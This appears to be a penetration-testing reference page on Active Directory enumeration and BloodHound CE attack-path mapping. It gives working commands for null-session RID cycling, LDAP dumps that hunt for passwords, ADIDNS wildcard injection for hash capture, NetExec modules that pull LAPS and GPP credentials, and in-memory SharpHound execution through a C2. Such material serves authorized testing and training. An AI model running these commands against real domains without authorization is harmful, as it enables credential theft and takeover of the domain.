---
title: "AD Enumeration & BloodHound CE"
description: "Unauthenticated and authenticated Active Directory enumeration, SMB/LDAP recon, ADIDNS abuse, and BloodHound attack path analysis"
tags:
  - Active Directory
  - Enumeration
  - BloodHound
  - LDAP
  - SMB
---

# AD Enumeration & BloodHound CE Attack Paths

!!! note "What this page is doing"
    Enumeration is building a trustworthy identity graph. Collect only what the scope allows, label the account and collection method, verify important edges manually, and describe the shortest path in terms of the permission that created it.

---

## 1. Unauthenticated Enumeration

=== " SMB & RPC (Null / Guest)"

    ```bash
    # SMB: OS version, signing, SMBv1, null session shares
    nxc smb <DC_IP> -u '' -p ''
    nxc smb <DC_IP> -u 'guest' -p '' --shares --sessions --users
    nxc smb 10.10.11.0/24 -u '' -p '' --gen-relay-list relay_targets.txt # Signing disabled hosts
    # RPCClient: user/group/domain enumeration over a null session
    rpcclient -U "" -N <DC_IP>
    # rpcclient $> enumdomusers
    # rpcclient $> enumdomgroups
    # rpcclient $> querydominfo
    # rpcclient $> querydispinfo
    # rpcclient $> lookupnames <USER>
    # rpcclient $> getdompwinfo
    # Impacket SID enumeration (RID cycling reveals ALL users/groups)
    impacket-lookupsid '<DOMAIN>/guest@<DC_IP>' ""
    impacket-rpcdump @<DC_IP> | grep -i "MS-RPRN\|MS-EFSRPC\|MS-DFSNM"
    ```

=== " LDAP Anonymous Bind"

    ```bash
    # Base object & naming contexts
    ldapsearch -x -H ldap://<DC_IP> -s base -b "" namingContexts defaultNamingContext
    DN="DC=corp,DC=local"
    # If anonymous bind is allowed, dump users & look for the juicy fields
    ldapsearch -x -H ldap://<DC_IP> -b "$DN" "(objectClass=user)" \
        sAMAccountName description info userPassword memberOf > ldap_users.txt
    # Machines, groups, and password policies
    ldapsearch -x -H ldap://<DC_IP> -b "$DN" "(objectClass=computer)" dNSHostName operatingSystem
    ldapsearch -x -H ldap://<DC_IP> -b "$DN" "(objectClass=group)" cn member
    # Quick Windows LDAP tooling (if you have a Windows attack box)
    # WinPEAS / SharpHound / ADSearch.exe
    ```
    !!! warning "Passwords in `description` and `info` attributes"
        Legacy service accounts frequently have passwords stored in `description`, `info`, or `userPassword` (cleartext in AD LDS). Always grep the full LDAP dump:
        ```bash
        grep -iE "pass|pwd|p@ss" ldap_users.txt
        ```

=== " DNS & ADIDNS Recon"

    ```bash
    # Zone transfer attempt (rarely enabled, but check)
    dig axfr @<DC_IP> <DOMAIN>
    # Enumerate DNS records from the AD-integrated zone (authenticated)
    adidnsdump -u '<DOMAIN>\<USER>' -p 'Password123!' <DC_IP>
    cat records.csv
    # Wildcard DNS injection (unauthenticated by default!) -> NTLM hash capture or MITM
    python3 krbrelayx/dnstool.py -u '<DOMAIN>\<USER>' -p 'Password123!' \
        -a add -r '*.<DOMAIN>' -d <LHOST> <DC_IP> -t A
    ```

---

## 2. Authenticated Enumeration (Most Common Path)

=== " NetExec (nxc) — The Swiss Army Knife"

    ```bash
    # SMB: shares, logged-on users, password policy, LAPS, and session hunting
    nxc smb <DC_IP> -u '<USER>' -p 'Password123!' --shares --sessions --loggedon-users
    nxc smb <DC_IP> -u '<USER>' -p 'Password123!' --pass-pol --rid-brute 5000
    nxc smb <DC_IP> -u '<USER>' -p 'Password123!' -M laps
    nxc smb <DC_IP> -u '<USER>' -p 'Password123!' -M gpp_password -M gpp_autologin
    nxc smb <DC_IP> -u '<USER>' -p 'Password123!' -M spider_plus -o DOWNLOAD_FLAG=True
    # LDAP: dump users, groups, computers, and descriptions in seconds
    nxc ldap <DC_IP> -u '<USER>' -p 'Password123!' --users --groups --computers
    nxc ldap <DC_IP> -u '<USER>' -p 'Password123!' --query "(objectClass=user)" "sAMAccountName description" | grep -i desc
    # Print every "password" written into descriptions / info fields
    nxc ldap <DC_IP> -u '<USER>' -p 'Password123!' --query "(&(objectClass=user)(description=*))" "sAMAccountName description"
    # WinRM / RDP / MSSQL availability checks for lateral movement planning
    nxc winrm 10.10.11.0/24 -u '<USER>' -p 'Password123!'
    nxc rdp 10.10.11.0/24 -u '<USER>' -p 'Password123!'
    nxc mssql 10.10.11.0/24 -u '<USER>' -p 'Password123!' --local-auth
    ```

=== " ACL & Trust Discovery with Impacket / BloodyAD"

    ```bash
    # Dump every ACL ACE on the domain object (find GenericAll / WriteDACL / ForceChangePassword)
    impacket-dacledit -action read -target-dn 'DC=corp,DC=local' -principal <USER> \
        '<DOMAIN>/<USER>:Password123!' -dc-ip <DC_IP>
    # BloodyAD: fast ACL enumeration and abuse (RBCD, shadow creds, password reset)
    bloodyAD --host <DC_IP> -d <DOMAIN> -u '<USER>' -p 'Password123!' get writable
    bloodyAD --host <DC_IP> -d <DOMAIN> -u '<USER>' -p 'Password123!' get object \
        --attr msDS-AllowedToActOnBehalfOfOtherIdentity
    # Trust enumeration (map the whole forest before targeting the parent domain)
    impacket-GetADUsers -all '<DOMAIN>/<USER>:Password123!' -dc-ip <DC_IP>
    nltest /domain_trusts /all_trusts /v # On Windows
    Get-ADTrust -Filter * # PowerShell / RSAT
    ```

---

## 3. BloodHound CE — Attack Path Mapping

BloodHound turns AD into a graph and finds the **shortest path from your foothold to Domain Admin**. In 2026 use **BloodHound Community Edition** with the SharpHound/AzureHound collectors.

=== " Collecting Data (Linux)"

    ```bash
    # BloodHound.py (pure Python collector) — fast and reliable from Linux
    bloodhound-python -d <DOMAIN> -u '<USER>' -p 'Password123!' -ns <DC_IP> -c All --zip
    bloodhound-python -d <DOMAIN> -u '<USER>' -p 'Password123!' -dc <DC_IP> -c All --hashes :<NTLM_HASH> --zip
    # Specific collection methods (stealthier — use what you need, not everything)
    # Group : group memberships + local admin rights (LOW noise)
    # Session : user sessions per computer (MEDIUM noise)
    # LoggedOn : privileged logons via registry (LOW noise, Windows only)
    # ACL : ACL edges = the money shot (LOW noise)
    # Trusts, ObjectProps, Container, RDP, DCOM, PSRemote, SPNTargets, DCOnly
    ```

=== " Collecting Data (Windows / C2)"

    ```powershell
    # SharpHound from a beacon (OPSEC: limit session collection, avoid DC-heavy scans)
    SharpHound.exe -c DCOnly --zipfilename bh_dconly.zip
    SharpHound.exe -c All,GPOLocalGroup --exclude-dcs --stealth --zipfilename bh_all.zip
    SharpHound.exe -c ACL,Trusts,ObjectProps,Container,Group,LocalAdmin
    # Run through a C2 loader without touching disk
    execute-assembly /path/to/SharpHound.exe -c DCOnly --zipfilename bh.zip
    ```

=== " Key Cypher Queries (Run These First)"

    ```cypher
    // 1. Shortest path from a compromised owned user to Domain Admins
    MATCH p = shortestPath((u:User {owned:true})-[*1..]->(g:Group))
    WHERE g.objectid ENDS WITH '-512' RETURN p

    // 2. Every principal with direct rights over Domain Admins
    MATCH p=(n)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns*1..]->(g:Group)
    WHERE g.objectid ENDS WITH '-512' RETURN p

    // 3. Users with DCSync rights (Replicating Directory Changes)
    MATCH p=(n)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN p

    // 4. Kerberoastable users with a path to DA
    MATCH (u:User {hasspn:true}) MATCH p=shortestPath((u)-[*1..]->(g:Group))
    WHERE g.objectid ENDS WITH '-512' RETURN p

    // 5. Computers where a Domain Admin has a session (highest-value targets)
    MATCH (u:User)-[:HasSession]->(c:Computer) WHERE u.admincount = true RETURN u,c

    // 6. Unconstrained delegation hosts (except DCs) - prime coercion targets
    MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name CONTAINS "DC" RETURN c

    // 7. ADCS ESC escalation edges (BloodHound CE + Certipy integration)
    MATCH p=(n)-[:ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC6|ADCSESC8*1..]->(c:Computer) RETURN p

    // 8. Foreign principals with rights inside this domain (trust abuse)
    MATCH p=(n)-[r]->(g:Group) WHERE n.domainsid <> g.domainsid RETURN p
    ```